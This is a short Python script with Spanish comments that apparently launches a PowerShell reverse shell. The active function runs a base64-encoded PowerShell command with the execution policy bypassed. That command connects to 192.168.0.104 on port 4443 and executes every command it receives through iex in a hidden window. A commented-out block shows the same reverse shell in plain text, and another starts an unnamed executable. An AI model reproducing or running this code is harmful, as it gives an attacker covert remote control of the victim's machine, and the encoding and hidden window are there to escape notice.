import subprocess

def ejecutar_powershell():
    # El comando PowerShell en formato codificado en base64
    command = "UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAUABTAEgATwBNAEUAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAewAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADkAMgAuADEANgA4AC4AMAAuADEAMAA0ACcALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAH0AIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuAA== "

    # Ejecutar el comando de PowerShell
    result = subprocess.run(["powershell", "-ep", "bypass", "-e", command], capture_output=True, text=True)

    # Mostrar la salida del comando
    print(result.stdout)

if __name__ == "__main__":
    ejecutar_powershell()


#import subprocess

#def ejecutar_powershell():
#    command = [
#        "powershell", "-Command", 
#        "Start-Process $PSHOME\powershell.exe -ArgumentList {"
#        "$client = New-Object System.Net.Sockets.TCPClient('192.168.0.104',4443);"
#        "$stream = $client.GetStream();"
#        "[byte[]]$bytes = 0..65535|%{0};"
#        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
#        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
#        "$sendback = (iex $data 2>&1 | Out-String);"
 #       "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
#        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
#        "$stream.Write($sendbyte, 0, $sendbyte.Length);"
#        "$stream.Flush();"
 #       "};"
 #       "$search.Close()}"
#        "-WindowStyle Hidden"
#    ]

#    # Ejecutar el comando de PowerShell
 #   result = subprocess.run(command, capture_output=True, text=True)

    # Mostrar la salida del comando
#    print(result.stdout)
#    print(result.stderr)  # También imprime los errores si los hay

#if __name__ == "__main__":
#    ejecutar_powershell()

#para ejecutar .exe
#import subprocess

#def ejecutar_exe():
    # Ruta del archivo .exe que deseas ejecutar
#    exe_path = "componet.exe"  # Cambia esta ruta por la de tu archivo

    # Comando para ejecutar el .exe
#    command = [exe_path]

    # Ejecutar el comando
#    result = subprocess.run(command, capture_output=True, text=True)

    # Mostrar la salida del comando
 #   print(result.stdout)
 #   print(result.stderr)  # También imprime los errores si los hay

#if __name__ == "__main__":
#    ejecutar_exe()
